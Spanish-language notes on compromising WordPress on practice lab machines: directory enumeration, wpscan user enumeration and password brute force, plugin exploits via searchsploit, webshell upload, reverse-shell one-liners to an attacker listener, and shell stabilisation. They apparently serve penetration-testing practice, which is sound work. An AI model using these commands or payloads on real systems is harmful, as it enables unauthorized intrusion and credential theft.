# WordPress y wpscan

Flujo usado en las máquinas **Academia** y **ACEITUNO**.

## 1. Detectar WordPress

- La instalación puede estar en la raíz o en un subdirectorio (`/wordpress`).
- Buscar `wp-login.php` o `wp-admin` con gobuster:

```
gobuster dir -u http://<IP>/wordpress -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html
```

## 2. Enumerar usuarios

```
wpscan --url http://<IP>/wordpress -e u
```

- `-e u` → enumera los usuarios (autor del blog, enlaces `/author/<usuario>`).

## 3. Fuerza bruta de contraseñas

```
wpscan --url http://<IP>/wordpress -e u --passwords /usr/share/wordlists/rockyou.txt
```

Resultado típico:

```
usuario: dylan
contraseña: password1
```

> WordPress tiene límite de intentos: si lo bloquea, espera o cambia la IP.

## 4. Plugins desactualizados

En el código fuente de la página aparece la versión del plugin (por ejemplo `wpDiscuz 7.0.4` o *Bit File Manager*). Con esa versión buscamos un exploit:

```
searchsploit <nombre-del-plugin>
searchsploit -m <ID>
```

El exploit suele requerir la ruta de WordPress y la URL de una publicación:

```
python3 49967.py -u http://<IP>/ -p /2024/04/23/hola-mundo/
```

Si el plugin permite **subir archivos** (file manager), subimos directamente una webshell `.php`.

## 5. Reverse shell desde el servidor web

Escuchamos en nuestro equipo:

```
rlwrap nc -lvnp 443
```

Y desde la webshell o la URL vulnerable enviamos la reverse shell (con la URL codificada: `%26` = `&`, `%2F` = `/`):

```
cmd=bash -c "sh -i >& /dev/tcp/<IP_LOCAL>/<PUERTO> 0>&1"
```

Versión para entornos mínimos con `busybox`:

```
busybox nc <IP_LOCAL> <PUERTO> -e /bin/sh
```

## 6. Shell interactiva (siempre después de cualquier reverse shell)

```
SHELL=/bin/bash script -q /dev/null
```

Luego `Ctrl+Z` para suspender y:

```
stty raw -echo && fg
```

Para que funcionen los atajos (`Ctrl+L` para limpiar, borrado de línea):

```
export TERM=xterm
```
